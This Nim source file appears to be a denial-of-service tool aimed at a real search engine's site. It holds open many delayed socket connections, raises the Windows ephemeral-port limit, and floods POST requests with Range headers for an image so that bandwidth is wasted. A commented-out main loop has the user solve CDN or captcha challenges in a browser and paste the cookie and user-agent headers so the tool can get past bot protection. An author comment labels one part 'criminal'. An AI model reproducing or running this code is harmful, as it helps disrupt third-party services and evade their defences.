import asynchttpserver, strutils, httpclient, threadpool, json, asyncdispatch, net, os, halonium, random, winregistry, asyncdispatch, asyncnet

proc winFix(enable: bool): void =
  var
    h: RegHandle
  try:
    h = open("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters", samWrite)
    h.writeInt32("MaxUserPort",65535)
  except OSError:
    echo "err: ", getCurrentExceptionMsg()
  finally:
    close(h)

proc SessionGrb(target: string, port: Port, delay: int, log = false) {.async.} =
  var socket = newAsyncSocket()
  var socketu = newSocket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
  try:
    await socket.connect(target, port)
    socketu.connect(target, port)
    if log == true:
      echo "Connected to " & target & ":" & intToStr(int(port))
    await socket.send("GET / HTTP/1.1\r\nHost: " & target & "\r\n\r\n")
    await sleepAsync(delay)
    socket.close()
  except:
    echo "Connection to " & target & ":" & intToStr(int(port)) & " failed: " & getCurrentExceptionMsg()

var imInFight: bool = false

proc inFight(target: string, userAgent: string): void =
  # this is criminal part
  {.cast(gcsafe).}:
    imInFight = true
    let session = createSession(Firefox, browserOptions = %*{
      "moz:firefoxOptions": {
        "prefs": {
          "general.useragent.override": userAgent
        }
      }
    })
    session.navigate(target)
    imInFight = false

proc inFightP(target: string, filePth: string, call: string): void =
  discard os.execShellCmd(call & " " & filePth & " -private -url " & target)

proc imgGrb(conType: string, target: string, targetImg: string, userAgent: string, range: int32, referer: string, cookieInject:string, timeout = 1200, log = false): bool =
  let client = newHttpClient(timeout = timeout)

  client.headers = newHttpHeaders({
    "Host": target,
    "User-Agent": userAgent,
    "Accept": "image/avif,image/webp,image/png,image/svg+xml,image/;q=0.8,/*;q=0.5",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Connection": "keep-alive",
    "Referer": referer,
    "Sec-Fetch-Dest": "image",
    "Sec-Fetch-Mode": "no-cors",
    "Sec-Fetch-Site": "same-origin",
    "cookie": cookieInject,
    "Priority": "u=5, i",
    "Pragma": "no-cache",
    "Cache-Control": "no-cache",
    "TE": "trailers",
    "Range": "bytes=0-" & intToStr(range)})
  let body = %*{}

  try:
    let response = client.request(conType & target & targetImg, httpMethod = HttpPost, body = $body)
    if log == true:
      echo response.status
      echo "Response body: ", response.body

    if response.code == Http200 or response.code == Http206:
      return true
    else:
      if log == true:
        echo "Error: Unexpected HTTP status code: ", response.code
      return false

  except HttpRequestError as e:
    if log == true:
      echo "HTTP request failed: ", e.msg
    return false
  except CatchableError as e:
    if log == true:
      echo "An error occurred: ", e.msg
    return false

proc SessionGrbWait(target: string, port: Port, del1 = 5000, del2 = 15000, log = false): void =
  while true:
    var delay = rand(del1..del2)
    asyncCheck SessionGrb(target, port, delay, log = log)

var
  bitRange: int32 = 290235
  bitWast = 0
  target = "duckduckgo.com"
  port: int32 = 443
  range: int64 = 100
  targetImg = "/static-assets/image/pages/home/devices/how-it-works/desktop/search-protection-back-dark.png"
  userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0"
  conType = "https://"
  call = "start"
  cookieInject = ""
  filePth = "C:/\"Program Files (x86)/Mozilla Firefox\"/firefox.exe" #in winDUSE lol

#[
spawn SessionGrbWait(target, Port(port), log = true)
while true:
  var outPass = spawn imgGrb(conType, target, targetImg, userAgent, bitRange, "https://duckduckgo.com/", cookieInject)
  if ^outPass == true:
    bitWast += bitRange
    echo "Send keep-alive packet to -> " & target & "[" & targetImg & "," & intToStr(bitWast) & "]"
  else:
    if imInFight == false:
      echo "Maybe its blocked by cdn or etc. try solve captcha, js,... by yourself (r for real browser / warn: use custom/rand fingerprint for browser)? [r/y/n]"
      var userInput = stdin.readLine()
      if userInput == "y":
        spawn inFight(conType & target, userAgent)
        # soon
      if userInput == "r":
        spawn inFightP(conType & target, filePth, call)
        echo "Give me your cookie header (like cf_chl_rc_m=2; xf_session=blahblah) ->"
        userInput = stdin.readLine()
        cookieInject = userInput
        echo "Give me your useragent header (enter for try old one) ->"
        userInput = stdin.readLine()
        if userAgent == "":
          discard
        else:
          userAgent = userInput
      elif userInput == "n":
        discard
runForever()
]#
